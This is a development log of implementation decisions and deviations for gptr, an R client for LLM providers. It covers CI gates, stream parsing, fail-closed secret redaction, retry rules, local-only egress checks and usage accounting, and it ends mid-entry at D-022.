# Implementation decisions and deviations

## D-001 — Branch and implementation authorization (2026-10-03)

Use `codex/gptr-1.0-implementation` from synchronized `main` instead of recreating
the already-merged historical `gptr-1.0` branch. This preserves the completed
design history and follows the current branch convention. No design behavior changes.

## D-002 — Isolated tooling and current environment (2026-10-03)

The maintainer's start-to-finish implementation request authorizes necessary
development setup. Missing dependencies and pinned roxygen2 will be installed
in an ignored project-local library rather than replacing the user's packages.
The tool inventory is checked live; old `/Users/wanjun` snapshots are historical.
The task logs will record exact versions and relevant test outcomes without
publishing the private host inventory.

## D-003 — Public transition begins before P25 (2026-10-03)

The maintainer explicitly requested rewriting README and GitHub About now.
Replace obsolete 0.7 examples with an accurate development-status overview.
Working examples and installation promises must track verified implementation;
P25 still owns the final user documentation and release validation.

## D-004 — Available implementation workflow (2026-10-03)

The named `superpowers:*` skills are not installed. Use the available subagent
tools for task-sized implementation and independent review, preserving actual
test-first evidence and plan gates. Do not install unrelated skills or claim
that a named external workflow was run.

## D-005 — Parallel foundation tasks (2026-10-03)

The maintainer authorized parallel implementation. P01 Tasks 19–21 run once
Task 3's service table is stable: their structural checks do not require the
remaining token/message utilities. Tasks 9–12 and 13–18 may proceed in separate
lanes after Task 8. Scope edits and Git commits to each owner, preserve actual
red/green checks, and rerun complete P01 acceptance after integration. No plan
or milestone is declared complete from a partial tree.

P02's independent event-catalogue task also begins after its actual P01
condition/encoding dependencies pass. P02 spec-engine tasks wait for the schema
and fake-provider contracts. This uses the tested interface dependency order;
full P01 acceptance still precedes P02 completion and milestone promotion.
P04 Task 1 (SSE/NDJSON splitters) likewise uses only the verified P01 JSON
decoder. It can run independently before registry/secrets integration; the
remaining transport tasks wait for their actual authentication prerequisites. P04 Tasks 4–5
(process supervision and the job table) also use only P01 interfaces and run in
a separate lane while root validates the immutable foundation snapshot.
Tasks that materialize secrets or persist transport data still wait for P03.

P06 Task 1's pure agent-loop state machine may likewise use the actual completed
P01/P02 interfaces while transport acceptance finishes. Four unused test helpers
that call future P06 functions (`local_events`, `test_session`, `test_run`,
`run_text`) are deferred until Tasks 3–5 supply those functions. Restore them
from Task 1's harness definition at their first dependent task; no production
stub or lint suppression stands in for those dependencies. Full P06/M1 gates
still require the complete dependency chain.

## D-006 — Effective connection cleanup gate (2026-10-03)

Independent review found that setting `_R_CHECK_CONNECTIONS_LEFT_OPEN_` around
`devtools::test()` does not check the test suite's connections: R CMD check uses
that flag for examples. CI now compares the complete R connection table before
and after the suite through `dev/ci/check-connections.R`. A synthetic leaking
connection is an explicit negative control. Ordinary R CMD check example
checks remain enabled. The full wrapper must also pass after P01 integration.

The combined P02/P04 snapshot exposed processx's two intentional process-wide
supervisor FIFOs. IC-60 already disables this supervisor under R CMD check.
The standalone connection gate now scopes the same `gptr.supervise = FALSE`
option and restores the caller's value, including on error. It still compares
the complete table without exemptions and retains its deliberate-leak negative
control; child cleanup and orphan recovery tests still execute.

## D-007 — Stream parser boundary corrections (2026-10-03)

The literal P04 splitter silently removed NUL bytes, changing provider data.
Both splitters now signal a typed provider error because R strings cannot
represent NUL; error messages never include the input. This is an explicit R
representation limit, not a claim that NUL is forbidden by the SSE standard.
Invalid retry fields are ignored before choosing the last valid numeric retry.
The contract's deliberate final-event flush behavior is preserved.


## D-008 — Independent usage-accounting component (2026-10-03)

P05 Task 1 consumes only P01 condition/list utilities and can be developed in a
separate file while the M0 registry, secrets and transport integration proceeds.
Its owner reconciles unknown usage and prices with IC-74 instead of copying the
older plan's conversion of missing measurements into zero. No later usage rows
or model resolution are implemented before their dependencies. This parallel
component does not complete P05 or advance the milestone gate.


## D-009 — Portable copy-safety controls (2026-10-03)

Hosted P01 validation exposed two test-harness assumptions. Windows child stdout
uses CRLF, so completion-marker parsing must accept CRLF as well as LF. A
synthetic output regression checks both successful completion and detection of
a copy under CRLF.

The literal plan's `str(big)` negative control makes no observable next-edit
copy on the hosted oldrel-4 R interpreter, although it does on this Mac. Use
`retained = big` as the portable negative control: keeping a second reference
must force the next edit to copy. The zero-copy requirement for the package's
fingerprint/save operations and the real edit tests is unchanged. Full Windows
and old-R acceptance still needs a new hosted run containing these corrections.

## D-010 — Streaming redaction fails closed at its bound (2026-10-03)

The literal P03 Task 3 implementation advances the emit point when a sensitive
candidate exceeds the hold-back cap, potentially releasing a secret prefix.
That conflicts with the design's confidentiality guarantee. The stream now
fails closed with `gptr_error_redaction_limit`, a numeric `limit` field and a
generic message. Held input is discarded; later push/flush calls remain failed.
Normal bounded streams retain chunk/whole parity. Overflow is an explicit
termination case, not a parity claim. Contract section 7.3 and the condition
table record this clarification; the P03 task log owns its regression evidence.

## D-011 — Explicit transport performance acceptance (2026-10-03)

Architecture section 6.18 explicitly requires INFRA-01's first-delta latency
and six-stream concurrency targets. P04's Global Constraints already state an
explicit exception for INFRA-01 and INFRA-23 to the general five-second guidance.
This records that existing exception; it introduces no new target or waiver. Run the named performance
checks on a resource-healthy host with competing heavy validation paused, and
record actual measurements. Ordinary functional tests should prefer event and
ordering assertions. A timing failure needs investigation, not a silently
loosened target or a substitute claim based only on receiving callbacks.

## D-012 — Reactor retries fail closed and honour the hint's class (2026-10-03)

P04 Task 12's literal plan code is changed in two behaviours; contract 8.1-8.2 governs both.

1. **A malformed commitment fails closed.** The plan's `reactor_failure()` used
   `isTRUE(tryCatch(tr$retry$committed(), error = function(e) TRUE))`, so a malformed result
   (`NA`, a non-logical or a longer vector) counted as "not committed" and the request was
   sent again. Now every result other than exactly `FALSE` counts as committed, the same as
   an error: no retry, and the classed condition goes to `on_fail`. Contract 8.2 retries only
   when `committed()` "is `FALSE`". A re-send after an ambiguous commitment could repeat side
   effects that the stream already delivered, such as deltas shown or tool calls emitted.
   Regression: "a malformed committed result fails closed without retrying".
2. **`reactor_retry()` decides whether the hint is retryable.** In the plan, every in-stream
   hint set `retry = TRUE`, except a `retry_after` above the cap. The decision now uses
   `retry_classify()`'s table: `auth`, `spend_cap`, `redirect`, `retry_after`, `timeout_idle`
   and `timeout_first_byte` are never retried. `overloaded`, `rate_limit`, `network`,
   `timeout_connect` and a 408, 409, 429 or 5xx status are retried. This keeps the
   nonretryable rules for every path that reports a failure: the spend cap is never retried,
   401/403 are `auth`, 3xx are never retried (IC-64), and the INFRA-05 timers are never
   retried. Only a retryable hint above `gptr.max_retry_delay` becomes class `retry_after`.
   `timeout_*` classes keep the parent `gptr_error_timeout`, and the others keep
   `gptr_error_provider` (contract 2.2). The condition's status is an integer, and its
   request id comes from the attempt's 2xx head. Regressions: "stream retry hints validate
   delays and preserve nonretryable classes" and "stream retry hints keep their class, the
   integer status and the server's request id".

## D-013 — Claude subagent workflow replaces the Astra/Luna lanes (2026-10-03)

The maintainer resumed the paused implementation with Claude Code and asked for
all work to be consolidated onto `main` (no feature branch, no PRs) with periodic
pushes. The handoff's model allocation (gpt-6-astra for implementation/review,
gpt-6-luna for tests) is not available in this harness. Each task now runs as:
a Claude implementer (actual red, implementation, actual green, scoped lint,
evidence in `progress/Pxx.md`), a separate Claude reviewer that independently
re-runs the focused tests and lint and audits the diff against plan and contract,
a fixer for blocker/major/minor findings (up to two re-review rounds), then a
commit of exactly the task's files with the plan's message. The separation of
implementation, independent review and acceptance is unchanged; no gate is
weakened. Pushing `main` triggers the hosted CI matrix, which supplies the
cross-platform evidence previously obtained through the draft PR.

## D-014 - IC-74 discovery and preflight choices in P05 Task 8 (2026-10-03)

IC-74 (`spec/07-local-ollama.md` sections 2 and 2.1) adds `model_prepare()` and
`provider_preflight()` but names no condition classes, and the plan's Task 8 literal predates
it. P05 Task 8 fixes these behaviours, which P08 and P13 consume:

1. **Condition classes.** Local-only refusals (non-loopback endpoint, cloud selector, remote
   markers, evidence without local execution) signal `gptr_error_untrusted` (`what`, `path` =
   the model ref, `origin`). Missing or stale discovery evidence, a missing capability, a
   model-level type/api mismatch or an old server signal `gptr_error_not_available` (`member` =
   the ref, `provided_by`). `gptr_models(provider = "ollama", refresh = TRUE)` can therefore
   signal these two classes besides the `invalid_argument`/`network` of contract section 6.2.
2. **Discovery egress.** Native discovery is itself refused before any request for a
   non-loopback endpoint unless the protected safety record sets `ollama_local_only = FALSE`;
   `gptr_models()` has no safety argument, so its Ollama refresh is loopback-only.
3. **Listed names grant nothing.** Generic `discover()` results (LM Studio, llama.cpp, vLLM) add
   descriptive entries without tools, vision or locality; the plan literal granted
   `tool_call = TRUE`.
4. **System 1 default.** `model_default("system1")` keeps the setting, then the TypeSafe key, then
   a native classifier whose current private evidence passes the default local-only preflight
   (07 section 5), skipping a provider disabled in the settings. It never discovers.
5. **Checked model.** `provider_preflight()` returns the model narrowed to the evidence (tools,
   reasoning, image input, context) with the evidence's digest, server version and locality,
   and a zero metered price when the evidence establishes local execution (so a bare catalog
   name such as `ollama/clef-flash` prices like its discovered `:latest` tag); a record whose
   digest or server version differs from current evidence is refused, so a prepared model is
   never silently replaced.

Validation: `progress/P05.md`, Task 8 (`test-catalog-models.R` IC-74 tests).

## D-015 - IC-74 usage rows: unknown cost and tier stay NA; validated roll-up (2026-10-03)

P05 Task 9's literal `usage_row()`/`usage_rollup()` predate IC-74 (07-local-ollama.md section 5:
"Missing usage remains unknown"). Behaviours changed, which P06, P13 and P20 consume:

1. **Cost only from evidence.** On the `api`, `system-one` and `emulated` routes the row's cost
   comes only from the dated price tier in force (`usage_cost()`); an unresolved model or a
   request before the first known price gives `NA`. The plan fell back to the message's own
   `cost$total`, which for a `usage_new()` record without `cost` is the legacy constructor zero.
   An explicit zero rate still gives a known zero cost, even with unknown tokens (Task 1 rule).
   The priced record is the resolved record after the same pure, no-I/O `provider_preflight()`
   the request ran (the plan priced the bare catalog record), so a bare Ollama name (shipped
   `ollama/clef-flash`, no prices) whose current `:latest` evidence establishes local execution
   records the zero metered charge that 07 section 5 requires, as the tagged name does; a record
   the preflight refuses (no current evidence, a cloud model) keeps its catalog prices.
2. **`tier` is `NA` when no price tier applies** (the plan wrote `"default"`).
3. **`plan-cli` cost is the CLI's reported `cost$total`, read from the message's usage record:**
   a supplied total (zero included) is kept, a missing one is `NA`, and an `estimated = TRUE`
   record (contract 4.3: the provider reported nothing, so no `total_cost_usd`) is `NA`, so P06's
   plan-literal estimator fallback in `run_response()` (`usage_new(..., estimated = TRUE)`) never
   records a known zero. A `usage_new()` record always carries a total, so **P20 adapters pass
   `cost = NULL` when the CLI reported usage but no `total_cost_usd`**.
4. **Validation.** `usage_row()` refuses non-scalar or invalid `session`, `agent`, `parent_id`,
   `started`, `seconds`, `multiplier` and message fields (`gptr_error_invalid_argument`) instead
   of recycling them into several rows; `usage_log_append()` validates the section 4.3 column
   types before the log changes; `usage_rollup()` refuses a session with two different recorded
   `parent_id`s and cyclic ancestry (the plan stopped silently at a cycle). An `NA` `parent_id`
   records no parent (contract 4.3; P13's System 1 rows of a child session), so it joins the
   parent its session's other rows record. Rows without a session (process System 1 calls) form
   the `NA` group; an `NA` value makes its group's sum `NA`.

Validation: `progress/P05-usage.md`, Task 9 (`test-provider-usage.R`; the evidence-priced row
in `test-catalog-models.R`).

## D-016 - Hosted CI corrections: INFRA-01 clock, service test isolation, old Windows R (2026-10-03)

Hosted run 37169255693 (`8e8d8e0`) and run 37170545611 (`a2ba302`) failed on every platform.
CI Task CI-1 changes how plan literals measure, isolate and check. Every contract, architecture
and decomposition target and threshold stays, and no product behaviour changes.

1. **INFRA-01 is measured on the mock's own clock.** P04's tests anchored the targets at the
   moment the client queued the transfers and compared raw arrival times. So connection setup,
   the mock's request handling (about 0.04 s locally to build a response plan before scheduling
   it) and any lateness in the mock's own writes all counted against gptr. Hosted macOS measured
   2.57 s for six streams, and the hosted connection job measured 2.4830 s and 2.553 s (limit
   2.475 s). Hosted macOS also had one consecutive delta gap of 0.35 s or more in both runs.
   With `log_writes = TRUE`, the mock (`fixtures/mock_server.R`) now also logs the wall-clock
   time just before it writes each response piece, and the SSE event the piece starts with.
   `local_mock_server()` returns that log as `writes()`. This adds a member to contract 12.2's
   list and changes nothing else; only the INFRA-01 tests enable it. The client records
   wall-clock arrivals on the same clock. The targets, with the plan's thresholds:
   - Architecture 6.18, "first delta within 0.35 s of the mock writing it": the latency
     (arrival minus write) of every delta, not only the first, is below 0.35 s.
   - Decomposition P04 acceptance 2 and P04 Global Constraints, "every inter-delta gap is under
     0.35 s": the gap between consecutive deltas on the mock's 0.25 s cadence,
     `0.25 + diff(latency)`, is below 0.35 s. When the mock writes on time this equals the raw
     arrival gap. It nets out only the mock's own lateness, so gptr's delivery may still vary
     by less than 0.1 s from one delta to the next, as before.
   - "Six streams of 1.00-2.25 s finish within 10% of the slowest": from the first response
     head the mocks wrote, which starts every stream's schedule, to the end of the last stream
     at the callback, at most 1.10 * 9 * 0.25 = 2.475 s. The bound is the plan's. Only the
     anchor moved, from the client's queue time to the first head write, which leaves out
     connection setup and the mock's request handling. Contention that stretches every stream
     still fails, and so do serialised streams.
   - A latency below -0.05 s fails, because it means arrivals were matched to the wrong writes.
   Synthetic controls pass on-time delivery and a mock write 0.11 s late. They fail a constant
   1.5 s delivery delay, a 0.4 s stall, a delta held back 0.11 s (a 0.36 s gap) or 0.34 s,
   batching, mismatched writes, six streams stretched to one delta per 0.375 s, and serialised
   streams. On the real mock, a 1.5 s pause of the pump and a 0.4 s hold after delta 4 both
   fail. The hold fails only on the gap, since its latency is 0.16 s. Local results over five
   repetitions: latency 0.3-41 ms; gaps at most 0.254 s; the mock's own write lateness at most
   2 ms after 37-42 ms of plan building; six-stream wall 2.268-2.273 s, against 2.34-2.37 s with
   the plan's anchor. Open item (D-011): the hosted macOS gap failure is not explained by
   connection setup, because a gap compares consecutive deltas. Its cause is unknown: either the
   mock's own write lateness, which is now netted out, or gptr's delivery, which still fails. The
   failure message now prints every latency and gap and the mock's own lateness. Read it on the
   next hosted macOS run.
2. **P01's service registration test is isolated from later built-ins.** In `test-aaa-state.R`,
   "ext_service_set() registers and replaces services" registers a `describe` service owned by
   built-in `workspace` (P09, not built yet). Once P02 is loaded, the plan's
   `service_builtin_active()` counts a built-in without enabled records as filtered out
   whenever the registry lists any records. So the test failed in every package run after the
   P03/P05 built-ins began loading records (hosted `test-aaa-state.R:127-128`). The test now
   mocks `service_builtin_active()` to `TRUE`, as its neighbour already does. It still tests
   registration and replacement in the bootstrap table; the rule keeps its own plan tests. The
   product rule stays the plan's, and P01 reads only `gptr_registry()`: contract 7.0 assigns
   `the$builtins` to P02. In a complete build, each provider plan declares the built-in that owns
   its services.
3. **Windows R before 4.5.0 runs R CMD check without `_R_CHECK_THINGS_IN_OTHER_DIRS_`.** That
   check reads `file.info()` owner columns, which Windows R has only from 4.5.0 (R NEWS). On
   the oldrel-4 job (R 4.2.3), R CMD check aborted at its start and rcmdcheck still reported
   success. The matrix entry sets the variable to `false` there only; every other configuration
   keeps it. Every R CMD check job now fails unless `check/gptr.Rcheck/00check.log` has a
   `Status:` line. Every job has a time limit, 120 minutes for R-devel, whose dependencies build
   from source for about 65 minutes on a cold cache. The connection gate runs the whole suite
   before comparing the connection table, then fails on failed tests and on any leak (D-006).

Validation: `progress/ci-hosted.md`, Task CI-1.

## D-017 - IC-74 request preflight and decision-only refusal in provider_stream() (2026-10-03)

P05 Task 10's literal `provider_stream()` predates IC-74. Behaviours changed, which P06, P07, P08,
P13 and P05 Task 11 consume:

1. **Preflight before egress.** `provider_stream()` calls `provider_preflight(model, provider,
   safety)` (07-local-ollama.md section 2.1) after the adapter/provider/`enabled` checks and before
   credential lookup and `build()`; the adapter and normaliser receive the checked model. A
   refused preflight is signalled before anything starts (`gptr_error_not_available` or
   `gptr_error_untrusted`, D-014), so a local-only selection never reaches the network.
2. **The safety record.** Read from the run's frozen option snapshot `run$opts$safety` (contract
   7.6, IC-53) and from `opts$safety`; only the field `ollama_local_only` is read. When a run is
   given its snapshot is authoritative, and a run without one counts as local-only. Either record
   can only tighten: local-only holds unless every record present says `FALSE`; a malformed
   record is `gptr_error_invalid_argument`; no record means local-only. `opts$safety` therefore
   relaxes the policy only for a caller with no run object at hand. P06/P08 must put
   `ollama_local_only` into the run's safety snapshot (human user/session configuration only).
3. **Decision-only models never stream.** A model with `type = "classifier"` is refused first
   (`gptr_error_not_available`, `member` = the model ref, `provided_by = "a conversational
   model"`), and so is an adapter without the stream functions of its transport (`member` = the
   api). P01's `fake_classifier_stream()` is therefore no longer reached through
   `provider_stream()`; System One requests go through `s1_request()` (contract 8.1).
4. **Transport drivers.** `stream_driver()` maps `http_sse`/`http_ndjson`/`http_json` to the HTTP
   driver; a transport without a driver is refused before anything starts (`not_available`,
   `member` = the transport). Task 11 adds `inprocess` and `process_jsonl` there (the plan
   literal referenced their functions before they existed).

Validation: `progress/P05.md`, Task 10 (`test-provider-registry.R`).

## D-018 - process_jsonl turns the glue ends drop their child; send only to the open turn (2026-10-03)

P05 Task 11's literal `process_jsonl` driver killed the session's child only on an abort or
when a new `start` replaced it. Behaviours P06 and P20 consume:

1. **A turn the glue ends itself forgets and kills its child.** Besides an abort, a local
   failure (an adapter normaliser error, a retry hint, which `process_jsonl` cannot re-send, a
   write failing after the spawn) and a run that settled while the turn was open end the turn
   and kill the child after forgetting it (`opts$state$process = NULL`). Its late lines and exit
   reach no turn, and the session's next turn must start a new child: a P20 adapter returns
   `start` when `opts$state$process` is NULL (and resumes its CLI session itself if it wants the
   context back). A turn the normaliser ends (`done`/`error` event) or the child's exit ends
   keeps a living child for the next turn.
   Every child the glue lets go of (these turns, a child a new `start` replaces, the job row's
   `stop()`) is stopped by `stream_process_kill(p, watch, job)` (Task 11 review, round 2): P04's
   `reactor_cancel()` of the child's watcher (the watcher goes, pending stdin is dropped, then
   `kill_all()`), and the job row is removed at once, because P04 reports no exit for a
   cancelled watcher. A child without a watcher is killed directly. `kill_all()` must never run
   under a living watcher: processx 3.9.0's `$kill()`/`$kill_tree()` close the child's pipes
   (`close_connections = TRUE`), so P04's line reader never reaches end of stream, the exit is
   never reported (no `on_exit`, so the `cli` job row stays `running`) and the closed pipes are
   polled in every later pump iteration (a full CPU core, measured by the reviewer). The job
   row's `stop()` (`gptr_jobs(kill = TRUE)`, unload) also reports the exit to the turn that last
   used the child from the next pump iteration (`reactor_timer()`), as P04 would have: an open
   turn ends through the normaliser's `finish()`.
   **For P20:** the planned `pcli_stop_child()` (P20 Task 9) forgets the child and then calls
   `kill_all(p, grace = 1)` directly, which hits the same leak while P05's watcher is
   registered. It should end with `stream_process_kill(p, state$watch, state$job)` instead (after
   its interrupt and `write_close()`), or stop through the row (`jobs_env()$table[[state$job]]`).
2. **`opts$send()` writes only to the open turn's own child.** A finished turn's `send()` writes
   nothing, so an asynchronous control response (a `control_request` answered after an abort)
   never reaches another child of the session.
3. **inprocess** streams also let go of a settled run without `done` (as `stream_watch()`,
   INFRA-15), and malformed generator steps end the stream with one `error` event.
4. **A process turn does not depend on its watch task** (Task 11 review, round 1).
   `provider_stream()` returns the watch task id for `process_jsonl` (04 section 8.4 step 5),
   and P06's `run_abort()` and `run_settle()` cancel it (P04: removed without callbacks), so the
   watch never sees that abort or settled run. Each line and the exit of the turn's child first
   apply the watch's rule (`stream_over()`: an aborted turn ends as `aborted`, a settled run's
   turn is let go without `done`), so the line never reaches the normaliser (no `gate` or
   `mcp_dispatch` call for an ended run), and both drop the child. A turn still open when the
   session's next turn starts (its child silent since the cancel) is let go and its child
   dropped before `build()`, so `build()` sees no child and returns `start`. P05 owns the
   `opts$state` fields `process`, `job`, `watch` (the child's P04 watcher id), `route`,
   `route_exit` and `stream_turn`.
   For P20: its `agent_end` hook (`pcli_stop_child()`, P20 Task 9) writes the interrupt and
   pumps until the acknowledgement or the child's death. The first line the child sends after
   the run settled now ends the turn and stops the child (`stream_process_kill()`: P04's
   `reactor_cancel()` of the watcher, then `kill_all()`: interrupt, grace, kill), so the wait
   ends at the child's death and the acknowledgement line is not pushed to the ended turn's
   normaliser. P04 reports no exit for that child, so the wait must test the child itself
   (`state$process` or `p$is_alive()`), not wait for an exit report. The rest of P20's design
   holds: `state$process` is NULL afterwards and the next turn starts a child.

Validation: `progress/P05.md`, Task 11 (`test-provider-registry.R`).

## D-019 - Windows processes: CRLF output, asynchronous kills, blocking child stdin (2026-10-03)

Hosted Windows release runs on `55ec31d` and `8e8d8e0` exposed eight process-engine failures,
and the `8e8d8e0` run hung in "checking tests" for 68 minutes (the job of run 37170545611 on
`a2ba302`, which had no time limit, was still running after two hours). CI Task CI-2 changes
the following; contract 7.4 and IC-60 are otherwise unchanged.

1. **CRLF child output.** R's stdout is a text-mode stream on Windows, so an R child's `"\n"`
   reaches the pipe as CRLF and an explicit `"\r\n"` as `"\r\r\n"`. `line_reader()` already strips
   one trailing CR (unchanged). `proc_run()` returns stdout and stderr as the child wrote them,
   CRLF included, as P22's `bridge_decode()` expects, so the byte-exact and code-page tests
   expect the platform's line end. The plan's fixtures that wrote an explicit CRLF (the
   `line_reader()` test and the reactor's byte-exact pipe test) write a bare LF on Windows, so
   one CRLF reaches the pipe on every OS. The `line_reader()` fixture also writes bytes instead
   of escapes: on macOS its `-e` expression `cat('a\\r\\nb\\nc')` wrote `"a\nb\nc"` (measured),
   so it had never tested CRLF there. New behaviour: `proc_run(echo = TRUE)` shows a CRLF line
   end as LF before redaction, so a registered multi-line value is redacted in a Windows child's
   output (hosted: `FAKEfirstLine\r\nFAKEsecondLine` was echoed unredacted). So that a value
   which itself holds CRLF still matches a child that writes it verbatim (review round 1: it
   leaked after the echo change), `secret_variants()` adds one derived form, the value with
   CRLF turned into LF, to the forms of architecture 6.5 (URL-encoded, JSON-escaped, base64
   cores). It only adds redaction; a value without CRLF has the same forms as before. The LF
   form is kept whenever the value itself is long enough to be redacted
   (`gptr.redact_min_chars`), not filtered by its own shorter length (review round 2: an
   8-character `"Ab3\r\nXy9"` lost its 7-character LF form and leaked when written verbatim).
2. **Tree markers on Windows.** `Rscript.exe` runs `Rterm.exe` as its child, which inherits the
   marker, so the plan's `length(proc_tree(marker)) == 1L` was FALSE there. The two tests now
   require the marked processes to be the child and its descendants only.
3. **Asynchronous kills.** On Windows `ps::ps_kill()` calls `TerminateProcess()`, which returns
   before the process has exited (on Unix `ps_kill()` sends SIGTERM and waits up to its grace
   period before SIGKILL). The orphan sweep checked for survivors at once and kept the marker
   file of an orphan that died moments later. New behaviour: `proc_cleanup_record()` (the sweep
   and `kill_all()`) waits at most 2 s for the processes it signalled to stop reading as running
   before it decides; it never waits on an unknown state, nor on a process whose kill failed
   (`ps_kill()`'s per-handle results; a kept record must not delay every `library(gptr)`).
   Nothing changes when the kill completed, as on Unix.
4. **The boundary test of a reused PID record** mocked `ps::ps_kill_tree()` and expected no
   call at all. processx's finalizer calls that binding by name with processx's own tree id, so
   a garbage collection during the test reached the mock (hosted Windows: 3 calls; reproduced
   on macOS by collecting a process started with `cleanup_tree = TRUE`). The test now collects
   a synthetic finalizer of the same kind and fails only on a signalled gptr marker.
5. **Blocking child stdin on Windows (open item, maintainer decision).** processx writes a
   child's stdin with a blocking `WriteFile()` on Windows: the pipe is created without
   `FILE_FLAG_OVERLAPPED`, in `PIPE_WAIT` mode, with a 64 KB buffer, and
   `processx_c_connection_write_bytes()` passes no `OVERLAPPED` (processx `src/win/stdio.c`,
   `src/processx-connection.c`). So IC-60's non-blocking `write_all()` holds only on Unix. On
   Windows, a write blocks until the child has read enough; a child that stops reading stdin
   while its stdout pipe is full (the 4 MB echo test) deadlocks the R process, and no
   `gptr.stdin_timeout` or pump timeout can end a call that never returns. The two tests that
   need a non-blocking write (the 4 MB echo and the stdin timeout on a child that reads nothing)
   skip on Windows with this deviation's number; the other stdin tests still run there. Making
   `write_all()` safe on Windows (for example a relay process or a bounded write size) is a
   P04 product decision, not made here. P18, P19, P20 and P22 children that receive large
   stdin payloads on Windows are affected until then.

The hosted Windows release job also streams the offline suite file by file before R CMD check
(`dev/ci/test-by-file.R`, 20-minute step limit, diagnosis only). Validation:
`progress/ci-hosted.md`, Task CI-2.

## D-020 - gptr_providers(): IC-74 egress and default model, one-attempt probe, row-local failures (2026-10-03)

P05 Task 12's literal `gptr_providers()` predates IC-74. Behaviours changed, which P08 (egress),
P13 and P20 (`status()` functions) consume:

1. **Egress follows the effective endpoint.** Contract 10.2 row 1 lets a `local` provider skip
   the egress acknowledgement; IC-74 (07-local-ollama.md sections 2.1 and 5) says the `local`
   hint is insufficient and a remote Ollama endpoint needs the normal acknowledgement. The
   `egress` column is therefore `ack` for an offline provider, for a `local` provider whose
   effective base URL is a loopback address (`catalog_endpoint()`), and otherwise only when the
   user settings' `egress.<id>` is `"ack"`. P08's `egress_check()` should apply the same
   effective-origin rule (P07/P08 row of 07 section 6).
2. **Default model by type.** A decision-only (classifier) model is never shown as the default
   of a chat or CLI provider, and a classifier provider shows only its classifier models (the
   plan took the newest active catalog row, which made `ollama/clef` Ollama's default chat
   model). Ollama's default is `NA` with the shipped snapshot, whose Ollama rows are
   classifiers.
3. **One probe, bounded.** `check = TRUE` calls `catalog_http_request(<base>/models, "GET",
   list(), NULL, timeout = 2, attempts = 1L, max_bytes = 65536)` instead of the plan's
   `catalog_http_get()`, whose P04 default policy retries (the plan says "one unauthenticated
   GET"). Any HTTP status proves reachability, also when it arrives with a body above the bound
   (the condition's `status`). The probe runs only for rows whose status is `ready` or `no key`.
4. **Failures stay in their row.** A credential lookup that fails other than with
   `gptr_error_no_key` (a plugin `auth` function that throws a plain R error or returns no
   handle), and a provider whose settings cannot be applied (an invalid
   `providers.<id>.headers`, which `provider_get()` refuses), show `error` instead of aborting
   the listing. An HTTP provider (its adapter's transport, or a built-in HTTP api while P12/P13
   have not registered the adapter) without a base URL shows `no base url`, with a malformed
   one `invalid base url` (the plan showed `no key` or `ready`), in both `check` modes, and
   neither is probed; only HTTP providers are probed (contract 6.2), so an `inprocess` or
   `process_jsonl` provider keeps its `check = FALSE` status. A provider's `status()` result
   lacking `status` maps `available` (`TRUE` -> `ready`, `FALSE` -> `unavailable`, else
   `unknown`), as plan ambiguity 18 requires; a `package_version` `version` is shown as text.
5. **The listing binds nothing.** The plan called `provider_credential()`, whose environment
   step registers the variable's value and binds it to the first provider's origin: listing
   providers in id order decided which provider could use a shared variable for the rest of
   the session (a plugin `gateway` keyed by `OPENAI_API_KEY` left `openai` with `no key`) and
   dispatched `secret_registered`, although contract 6.2 says the function emits nothing.
   `gptr_providers()` calls `provider_credential(p, register = FALSE)`: the same order and
   outcome, but an environment (or plain stored) value is only fingerprinted (P03's 6 hex), and
   a value the vault already binds elsewhere counts as absent. vLLM's built-in optional-key
   function is looked up the same way (its `gptr_optional_auth` attribute names the variable);
   a plugin's `auth` function is still called. P03's `auth_store_get()` still registers stored
   fields unbound when it reads them (its contract; no origin binding).

Validation: `progress/P05.md`, Task 12 (`test-provider-registry.R`). This entry first landed in
commit 90a43f5 (an unrelated CI commit); point 5 and the transport and settings parts of
point 4 were added by Task 12's review round 1.

## D-021 - IC-74 usage frames: missing usage stays NA, unknown counts print "unknown" (2026-10-03)

P06 Task 2's literal `usage_conform()` and `format_count()` predate IC-74 (07-local-ollama.md
section 5: "Missing usage remains unknown"). Behaviours changed, which P06 Tasks 4, 10, 11 and 13
and P18's tests consume through `usage_add()`/`gptr_usage()`:

1. **Missing columns are unknown.** `usage_conform(row)` fills every column the row lacks with the
   typed NA of P05's `usage_empty()`, the token and cost columns included (the plan filled those
   with 0). A known zero in the row stays zero. Rows from P05's `usage_row()` (complete, with
   D-015's NA for unknown tokens and unpriced cost) pass through unchanged. A fixture that means
   "known zero cache use" must state the zero columns.
2. **Unknown sums and counts.** `usage_totals()` sums without `na.rm`, so one unknown value makes
   its total unknown (as P05's `usage_rollup()`); `format_count()` returns `"unknown"` for an
   unknown count (the plan's version errored on NA) and picks the unit from the printed value
   (999.7 -> `"1.0k"`, 999999 -> `"1.0M"`).
3. **No silent coercion.** `usage_conform()` refuses wrong-typed columns (character tokens,
   numeric ids, non-logical `estimated`, unparsed `started`), known numbers that are negative,
   infinite or NaN, and a known `started` that is infinite or NaN, with
   `gptr_error_invalid_argument` (`arg = "row$<col>"`), P05's rule for usage rows (an NA start
   stays unknown); a bare logical `NA` column becomes its typed NA. It also refuses (`arg =
   "row"`) a non-list input and a list that is not named, equal-length, non-nested columns
   (a `NULL` element is an absent column), which `as.data.frame()` would otherwise flatten,
   recycle or rename. The plan's `as.numeric()` would have turned bad input into an invented
   unknown with a warning.

Later tasks that print usage must treat an unknown cost the same way (the plan's
`sprintf("$%.4f", ...)` footers print `$NA`).

Validation: `progress/P06.md`, Task 2 (`test-session-budget.R`).

## D-022 - IC-74 usage in the P12 normaliser core; contract-typed stop reasons and errors (2026-10-03)

P12 Task 1's literal `adp_usage()` predates IC-74 (07-local-ollama.md section 5: "Missing usage
remains unknown"). Behaviours changed in the shared normaliser core (`R/provider-anthropic.R`),
which every P12 adapter, P20's reuse of `anthropic_normaliser()` and P06's usage rows consume:

1. **Unreported usage is unknown.** A stream that reported no usage at all (for example an error
   before Anthropic's `message_start`, or an OpenAI-compatible server that sends no usage chunk)
   gives a message whose counters, total and cost are `NA` (P05's `usage_as(NULL)`); the plan
   wrote zeros. A reported value that is not a nonnegative number is `NA`; a field the provider
   left out of a reported usage keeps P05's legacy zero (P05 Task 1's "genuine partial
   observation" rule), so the hand-written golden usages are unchanged. Reported usage is merged
   as a cumulative update (Anthropic's `message_delta`; report 03 section 2.5.1, the SDK's
   MessageDeltaUsage): a JSON null keeps the value reported before it and is `NA` only when
   nothing was reported before (`adp_usage_set()`), including the `cache_creation` split fields
   (the plan's `%||% 0` made a null split field a known zero).
2. **Cost only from price evidence.** The message's cost always comes from `usage_cost()` with the
   model's dated prices: an unpriced model has an unknown cost (the plan kept `usage_new()`'s
